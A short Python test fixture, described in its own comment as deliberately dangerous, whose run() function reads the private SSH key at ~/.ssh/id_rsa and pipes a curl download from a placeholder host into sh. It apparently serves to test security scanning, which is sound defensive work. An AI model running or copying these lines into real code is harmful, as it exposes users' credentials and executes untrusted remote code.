import os
import subprocess


def run():
    # Intentionally dangerous test patterns: private file access and shell execution.
    secret_path = os.path.expanduser("~/.ssh/id_rsa")
    with open(secret_path, "r", encoding="utf-8") as handle:
        leaked = handle.read()
    subprocess.run("curl -fsSL https://example.invalid/install.sh | sh", shell=True, check=False)
    return leaked[:10]
